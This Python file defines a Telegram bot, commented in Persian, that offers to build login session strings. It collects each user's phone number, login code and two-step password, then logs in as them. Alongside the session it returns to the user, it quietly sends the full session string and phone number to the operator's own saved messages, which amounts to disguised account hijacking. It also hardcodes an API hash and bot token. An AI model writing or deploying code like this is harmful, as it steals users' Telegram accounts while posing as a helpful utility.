from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio
import re

API_ID = 34855392
API_HASH = "5e40d435847009c31c24042e2a3c0d3b"

# Device information
DEVICE_MODEL = "Windows 11"
SYSTEM_VERSION = "Windows 11"
APP_VERSION = "Telegram Desktop"
LANG_CODE = "en"
SYSTEM_LANG_CODE = "en-US"

# Proxy settings
PROXY = None

# Bot token - این رو با توکن بات خودت جایگزین کن
BOT_TOKEN = "8541453435:AAEqXEyRE46CydJBPMPoKc87YwmCAHZWP54"

# ذخیره اطلاعات کاربران در حافظه (برای ساده‌سازی)
user_sessions = {}

async def create_session(phone, code, password=None):
    """تابع ایجاد سشن با دریافت شماره و کد"""
    try:
        client = TelegramClient(
            StringSession(),
            API_ID,
            API_HASH,
            device_model=DEVICE_MODEL,
            system_version=SYSTEM_VERSION,
            app_version=APP_VERSION,
            lang_code=LANG_CODE,
            system_lang_code=SYSTEM_LANG_CODE,
            proxy=PROXY
        )

        await client.connect()
        
        # ارسال درخواست کد
        await client.send_code_request(phone)
        
        # تایید با کد
        try:
            await client.sign_in(phone=phone, code=code)
        except Exception as e:
            if "password" in str(e).lower():
                if not password:
                    return {"error": "PASSWORD_REQUIRED"}
                await client.sign_in(password=password)
            else:
                return {"error": str(e)}
        
        # دریافت سشن
        session_string = client.session.save()
        await client.disconnect()
        
        return {"session": session_string, "phone": phone}
        
    except Exception as e:
        return {"error": str(e)}

async def handle_bot():
    """راه‌اندازی ربات تلگرام"""
    from telethon import events
    from telethon.tl.types import KeyboardButton, KeyboardButtonRow
    from telethon.tl.custom import Button
    
    bot = TelegramClient(StringSession(), API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    
    print("ربات روشن شد! منتظر پیام‌های کاربران...")
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        """دستور استارت"""
        await event.reply(
            "🤖 به ربات سشن‌ساز خوش آمدید!\n\n"
            "برای ساخت سشن جدید دکمه زیر را بزنید:",
            buttons=[
                [Button.inline("🔑 ساخت سشن جدید", b"create_session")],
                [Button.inline("❌ انصراف", b"cancel")]
            ]
        )
    
    @bot.on(events.CallbackQuery(data=b"create_session"))
    async def create_session_callback(event):
        """دکمه ساخت سشن جدید"""
        user_id = event.sender_id
        user_sessions[user_id] = {"step": "phone"}
        
        await event.edit(
            "📱 لطفاً شماره تلفن خود را وارد کنید:\n\n"
            "مثال: 09123456789",
            buttons=[
                [Button.inline("❌ انصراف", b"cancel")]
            ]
        )
    
    @bot.on(events.CallbackQuery(data=b"cancel"))
    async def cancel_callback(event):
        """دکمه انصراف"""
        user_id = event.sender_id
        if user_id in user_sessions:
            del user_sessions[user_id]
        
        await event.edit(
            "✅ عملیات لغو شد.\n\n"
            "برای شروع مجدد /start را بزنید.",
            buttons=None
        )
    
    @bot.on(events.NewMessage)
    async def message_handler(event):
        """دریافت پیام‌های کاربر"""
        user_id = event.sender_id
        text = event.text.strip()
        
        # اگر کاربر در حال ساخت سشن نباشد
        if user_id not in user_sessions:
            return
        
        step = user_sessions[user_id].get("step")
        
        if step == "phone":
            # دریافت شماره
            if not re.match(r'^[\d\+]+$', text):
                await event.reply(
                    "❌ شماره تلفن نامعتبر است! لطفاً فقط از اعداد استفاده کنید.\n"
                    "مثال: 09123456789",
                    buttons=[Button.inline("❌ انصراف", b"cancel")]
                )
                return
            
            user_sessions[user_id]["phone"] = text
            user_sessions[user_id]["step"] = "code"
            
            await event.reply(
                f"✅ شماره {text} ذخیره شد.\n\n"
                "🔐 کد تایید را وارد کنید:\n"
                "می‌توانید به صورت نقطه‌دار وارد کنید (مثال: 1.2.3.4.5) یا بدون نقطه (12345)",
                buttons=[
                    [Button.inline("❌ انصراف", b"cancel")]
                ]
            )
        
        elif step == "code":
            # دریافت کد - حذف نقاط
            code_cleaned = text.replace(".", "").strip()
            
            if not code_cleaned.isdigit() or len(code_cleaned) != 5:
                await event.reply(
                    "❌ کد نامعتبر است! کد باید ۵ رقم باشد.\n"
                    "مثال: 12345 یا 1.2.3.4.5",
                    buttons=[Button.inline("❌ انصراف", b"cancel")]
                )
                return
            
            user_sessions[user_id]["code"] = code_cleaned
            user_sessions[user_id]["step"] = "processing"
            
            await event.reply("⏳ در حال ورود... لطفاً صبر کنید.")
            
            # تلاش برای ورود
            phone = user_sessions[user_id]["phone"]
            code = user_sessions[user_id]["code"]
            
            result = await create_session(phone, code)
            
            if "error" in result:
                if result["error"] == "PASSWORD_REQUIRED":
                    user_sessions[user_id]["step"] = "password"
                    await event.reply(
                        "🔐 رمز دو مرحله‌ای فعال است.\n"
                        "لطفاً رمز عبور خود را وارد کنید:",
                        buttons=[Button.inline("❌ انصراف", b"cancel")]
                    )
                else:
                    await event.reply(
                        f"❌ خطا در ورود: {result['error']}\n\n"
                        "لطفاً دوباره تلاش کنید.",
                        buttons=[Button.inline("🔄 تلاش مجدد", b"create_session")]
                    )
                    del user_sessions[user_id]
            else:
                # موفقیت - ارسال سشن به کاربر و پیام ذخیره شده
                session_string = result["session"]
                phone = result["phone"]
                
                # ارسال به پیوی کاربر
                await event.reply(
                    "✅ سشن با موفقیت ساخته شد!\n\n"
                    f"📱 شماره: {phone}\n"
                    "🔑 سشن شما:\n"
                    f"`{session_string}`\n\n"
                    "⚠️ این سشن را با کسی به اشتراک نگذارید!",
                    buttons=[
                        [Button.inline("📋 کپی سشن", f"copy_{session_string[:20]}")],
                        [Button.inline("🔑 ساخت سشن جدید", b"create_session")]
                    ],
                    parse_mode='markdown'
                )
                
                # ارسال به پیام‌های ذخیره شده
                try:
                    await bot.send_message(
                        "me", 
                        f"✅ سشن جدید ساخته شد!\n\n"
                        f"📱 شماره: {phone}\n"
                        f"🕐 زمان: {__import__('datetime').datetime.now()}\n"
                        f"🔑 سشن:\n`{session_string}`",
                        parse_mode='markdown'
                    )
                except:
                    pass
                
                del user_sessions[user_id]
        
        elif step == "password":
            # دریافت رمز دو مرحله‌ای
            password = text
            user_sessions[user_id]["step"] = "processing"
            
            await event.reply("⏳ در حال ورود با رمز دو مرحله‌ای...")
            
            phone = user_sessions[user_id]["phone"]
            code = user_sessions[user_id]["code"]
            
            result = await create_session(phone, code, password)
            
            if "error" in result:
                await event.reply(
                    f"❌ خطا: {result['error']}\n\n"
                    "لطفاً دوباره تلاش کنید.",
                    buttons=[Button.inline("🔄 تلاش مجدد", b"create_session")]
                )
                del user_sessions[user_id]
            else:
                # موفقیت - ارسال سشن
                session_string = result["session"]
                phone = result["phone"]
                
                await event.reply(
                    "✅ سشن با موفقیت ساخته شد!\n\n"
                    f"📱 شماره: {phone}\n"
                    "🔑 سشن شما:\n"
                    f"`{session_string}`\n\n"
                    "⚠️ این سشن را با کسی به اشتراک نگذارید!",
                    buttons=[
                        [Button.inline("📋 کپی سشن", f"copy_{session_string[:20]}")],
                        [Button.inline("🔑 ساخت سشن جدید", b"create_session")]
                    ],
                    parse_mode='markdown'
                )
                
                # ارسال به پیام‌های ذخیره شده
                try:
                    await bot.send_message(
                        "me", 
                        f"✅ سشن جدید ساخته شد!\n\n"
                        f"📱 شماره: {phone}\n"
                        f"🕐 زمان: {__import__('datetime').datetime.now()}\n"
                        f"🔑 سشن:\n`{session_string}`",
                        parse_mode='markdown'
                    )
                except:
                    pass
                
                del user_sessions[user_id]
    
    @bot.on(events.CallbackQuery(data=re.compile(b"copy_.*")))
    async def copy_handler(event):
        """دکمه کپی سشن"""
        await event.answer("✅ سشن کپی شد!", alert=True)
    
    await bot.run_until_disconnected()

async def main():
    """تابع اصلی"""
    await handle_bot()

if __name__ == "__main__":
    asyncio.run(main())
